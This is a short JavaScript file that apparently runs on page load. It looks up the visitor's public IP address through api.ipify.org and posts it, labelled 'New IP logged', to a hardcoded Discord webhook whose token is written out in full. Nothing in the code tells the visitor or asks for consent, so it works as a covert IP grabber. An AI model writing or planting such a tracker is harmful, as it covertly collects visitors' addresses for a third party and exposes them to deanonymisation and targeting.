async function getUserIP() {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
}

async function sendToWebhook(ip) {
    const webhookURL = 'https://discord.com/api/webhooks/1360750154365272178/bwM6tc9NmSQB9jm6v6h3mItziwLxWJp90RAQhCDXlTivFbexzBoTiC69jUCXSMFuo7Rc';
    const message = {
        content: `New IP logged: ${ip}`
    };

    await fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });
}

async function logIP() {
    const ip = await getUserIP();
    await sendToWebhook(ip);
}

logIP();
